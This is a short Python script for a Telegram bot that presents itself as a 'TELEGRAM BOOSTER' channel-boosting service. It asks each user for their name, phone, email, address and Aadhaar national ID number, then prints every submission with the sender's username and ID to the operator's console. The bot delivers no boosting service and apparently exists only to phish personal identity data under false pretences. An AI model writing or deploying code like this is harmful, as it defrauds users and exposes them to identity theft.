import telebot
import os

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Welcome to TELEGRAM BOOSTER - Boost channel.\n\nPlease send your details in the following format:\nName, Phone, Email, Address, Aadhaar")

@bot.message_handler(func=lambda m: True)
def collect_info(message):
    info = message.text
    user = message.from_user
    log = f"👤 New Entry\nFrom: @{user.username or 'NoUsername'}\nID: {user.id}\nData: {info}\n---"
    print(log)
    bot.send_message(message.chat.id, "✅ Thank you. Your data has been received.")

bot.polling()
